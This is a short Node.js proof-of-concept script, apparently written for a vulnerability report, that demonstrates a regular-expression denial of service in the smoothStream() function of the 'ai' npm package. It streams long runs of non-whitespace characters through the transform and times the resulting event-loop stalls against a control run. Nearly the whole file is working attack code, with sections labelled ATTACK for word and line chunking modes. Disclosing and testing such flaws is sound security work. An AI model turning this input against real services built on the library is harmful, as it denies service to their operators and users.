'use strict';
// PoC — Event-loop DoS (quadratic/cubic ReDoS) in @ai-sdk `smoothStream()`.
// Real published `ai` package. delayInMs:null isolates CPU cost from the
// intentional smoothing delay, so timings reflect pure regex work only.
const { smoothStream } = require('ai');

function stream(total, delta, joiner /* inserted every `joiner` chars, or 0 for none */) {
  let sent = 0, sinceWs = 0;
  return new ReadableStream({
    pull(c) {
      if (sent >= total) return c.close();
      let text = '';
      const n = Math.min(delta, total - sent);
      for (let i = 0; i < n; i++) {
        text += 'a'; sent++; sinceWs++;
        if (joiner && sinceWs >= joiner) { text += ' '; sinceWs = 0; }
      }
      c.enqueue({ type: 'text-delta', text, id: '1' });
    },
  });
}

async function measure(label, total, opts, joiner) {
  const transform = smoothStream(opts)({ tools: {} });
  const out = stream(total, 4, joiner).pipeThrough(transform);
  const reader = out.getReader();
  let ticks = 0, maxGap = 0, last = Date.now();
  const hb = setInterval(() => { const now = Date.now(); maxGap = Math.max(maxGap, now - last); last = now; ticks++; }, 100);
  const t = Date.now();
  while (true) { const { done } = await reader.read(); if (done) break; }
  const ms = Date.now() - t;
  clearInterval(hb);
  console.log(`${label.padEnd(42)} time=${(ms / 1000).toFixed(2)}s  100ms-timer-ticks=${ticks}  maxTimerGap=${maxGap}ms`);
  return ms;
}

(async () => {
  console.log('=== smoothStream() DoS — real ai@' + require('ai/package.json').version + ' (delayInMs:null) ===\n');
  console.log('# CONTROL: whitespace every 8 chars — normal operation');
  await measure("word mode, 8000 chars, ws-every-8", 8000, { delayInMs: null }, 8);
  console.log('\n# ATTACK: default word mode, contiguous non-whitespace output');
  for (const L of [2000, 4000, 6000]) await measure(`word mode, ${L} non-ws chars`, L, { delayInMs: null }, 0);
  console.log('\n# ATTACK: line mode, output with no newline');
  await measure("line mode, 4000 non-newline chars", 4000, { delayInMs: null, chunking: 'line' }, 0);
})();
